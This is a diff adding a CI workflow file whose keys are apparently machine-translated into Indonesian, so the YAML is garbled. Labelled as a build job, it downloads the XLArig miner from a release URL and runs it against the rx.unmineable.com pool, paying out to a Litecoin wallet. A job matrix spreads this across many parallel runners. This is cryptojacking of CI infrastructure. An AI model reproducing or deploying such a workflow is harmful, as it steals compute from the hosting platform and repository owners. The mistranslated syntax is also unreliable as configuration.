@@ -1,0 +1,26 @@
+nama: eX-code_UMBL
+ 
+pada : [ alur kerja_dispatch ]
+ 
+pekerjaan:
+  membangun:
+    nama: eX-code_UMBL
+    berjalan-on: windows-terbaru
+    strategi:
+      paralel maks: 5
+      gagal-cepat: salah
+      matriks:
+        pergi: [1.0, 1.1, 1.2, 1.3, 1,35]
+        bendera: [A, B, C, D, E, F, G, H, I]
+    lingkungan:
+        NUM_JOBS: 20
+        PEKERJAAN: ${{ matrix.go }}
+    Langkah:
+    - nama: PERSIAPAN
+      jalankan: Invoke-WebRequest https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-win64.zip -Outfile XLArig-v5.2.2-win64.zip
+    - nama: Pengaturan-UP
+      jalankan: Perluas-Arsip XLArig-v5.2.2-win64.zip
+    - nama: Lari
+      jalankan: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o rx.unmineable.com:3333 -px -a rx -k -t 1 --cpu-max-threads-hint 25 -u LTC:MQuc2qWD2HLqPyY6nDH9kAfAit6M2qFGv7.Pemulung
+    - nama: SELESAI
+      lari: keluar
